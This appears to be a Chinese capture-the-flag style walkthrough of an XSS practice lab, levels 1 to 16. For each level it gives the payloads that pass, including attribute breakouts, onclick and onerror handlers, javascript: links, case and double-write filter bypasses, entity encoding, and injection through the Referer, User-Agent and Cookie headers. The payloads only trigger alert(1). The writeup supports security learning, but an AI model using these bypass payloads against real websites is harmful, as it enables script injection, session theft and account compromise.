## https://xss.angelo.org.cn/level1.php?name=test

## level1

直接注入

直接添加payload

```html
name=<script>alert('xss')</script>
```

## level2

直接注入`name=<script>alert('xss')</script>`，发现不行

查看网页源代码：

```html
<input name="keyword" value="<script>alert('xss')</script>">
```

尝试闭合value

构造payload(引号也得加上，否则无法闭合)

```html
"><script>alert('xss')</script><"
```

## level3

尝试构造闭合`"><script>alert(1)</script><"`

网页源代码：

```html
<input name="keyword" value="&quot;><script>alert(1)</script><&quot;">
```

发现`"`被编码为了xml实体格式，如果将`"`换成`'`发现 `<` `>` 也被编码为了xml实体格式。。。难受

发现这题是用的`'`闭合

用`'`闭合value，然后创建一个点击，payload如下

```
' onclick='alert(1)
```

最后点击输入框

## level4

payload:(这个题是用的`"`闭合)

```
" onclick="alert(1)
```

## level5

直接继续onclick，终于不行了

```php+HTML
<input name="keyword" value="" o_nclick="alert(1)">
```

将onclick给处理了，（其实把script也处理了，大小写也不能绕过）

下面可以尝试一下其他标签：a标签       [html标签](https://www.runoob.com/tags/html-reference.html)

```
"> <a href=javascript:alert(1)><"
```

## level6

* `"> <a href=javascript:alert(1)><"`

  过滤了href，尝试大小写绕过

  payload：`"> <a hrEf=javascript:alert(1)><"`

* onclick, script都可以用大小写绕过

## level7

过滤了on，herf， script ，全部被替换成空(也导致javascript被屏蔽掉了)

* 尝试大小写绕过，失败

* 尝试双写绕过

  成功， payload:`"> <a hhrefref=javasscriptcript:alert(1)><"`

## level8

尝试`"> <a href=javascript:alert(1)><"`，

* 发现过滤了`href`，`script`，`"`，盲猜`onclick`也被过滤了

* 发现在友情连接那里添加了一个超链接网址，但是不能使用`javascript`，因为`script`被过滤了

方法一：使用空字符隔开`script`等

`%0d,%0a `等，需要在地址栏输入

方法二：使用[命名实体](https://www.jb51.net/onlineread/htmlchar.htm)编码(非特殊字符转义后变成 `&#[ASCII码];` 如`s`就变成`&#083;`或者`&#83;`)

payload:

```
java&#083;cript:alert(1)
```

## level9

啊这，怎么提交发现都不会改变那个href。。。都是“您的链接不合法..”

那我们就手动改，直接改成javascript:alert(1)。点击，通过，我又好了

好吧，这题应该不是这样做的。

后台检查链接不合法，应该是检查`http://`字段

将其注释掉就好

payload：`javascript:alert(1) // http://`

发现还把script过滤了，改成实体

payload:   `java&#083;cript:alert(1) // http://`

## level10

发现有三个隐藏的参数

构造`https://xss.angelo.org.cn/level10.php?t_sort=1&t_link=2&t_history=3`

发现只有t_sort可以回显

```html
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="1" type="hidden">
```

发现 `<` `>`都被过滤了，使用onclick，还要将type改成可点击的

```
t_sort=" onclick="alert(1)" type=button
```

## level11

像第十题那样测试一下，发现t_sort可以用，但是过滤了`"`，无法闭合

靠t_sort必做不出来了，裂开

去找找其他的。。（我又想直接改html的源码了，，，直接过关）

猜测与t_ref有关，但是无法传输...

我好像从level10升到level11的时候看到这里是有东西的

ref...好熟悉的玩意儿

Referer？？？？

```http
GET /level11.php?keyword=good%20job! HTTP/1.1
Referer: "onclick="alert(1)" type="button"
```

## level12

看到这个

```html
<input name="t_ua" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edg/86.0.622.51" type="hidden">
```

好了，这就去改 User-Agent

```http
GET /level11.php?keyword=good%20job! HTTP/1.1
User-Agent: "onclick="alert(1)" type="button"
```

## level13

```html
<input name="t_cook" value="call me maybe?" type="hidden">
```

cook... cookie?

burp抓包(只展示了关健部分)：

```http
GET /level13.php?keyword=good%20job! HTTP/1.1
Cookie: user=call+me+maybe%3F
```

果然在cookie的地方看到了

直接改

```http
GET /level13.php?keyword=good%20job! HTTP/1.1
Cookie: user="onclick="alert(1)" type="button"
```

## level14

好像环境有问题

## level15

看到njInclude的注释，直接开搜，看看怎么用      [ng-include](https://www.w3schools.com/angular/ng_ng-include.asp)

看起来像是和php的include差不多，但是还是不懂

直接看WP，说参数是src

上面的用法里又发现了src，所以是要包含一个文件，也许可以用其他网站的xss漏洞进行攻击.

```html
<ng-include src="filename" onload="expression" autoscroll="expression" ></ng-include>
```

payload：（包含了第一题）

```html
https://xss.angelo.org.cn/level15.php?src="level1.php?name=<a href=javascript:alert(1)>xss</a>"
```

## level16

这个题将空格、`script`以及`/`给编码为html实体的空格  [html标签](https://www.runoob.com/tags/html-reference.html)

看看还有哪些可以用`img` `iframe` `input` `svg`

用`%0a`或者`%0d`绕过空格

payload:(需要将空格换成`%0a`或者`%0d`)

```html
<img src=ssss.ss onerror=alert(1)>
<iframe src=11 onload=alert(1)>
<input value="111" type="button" onclick=alert(1)>
<svg onload=alert(1)>
```

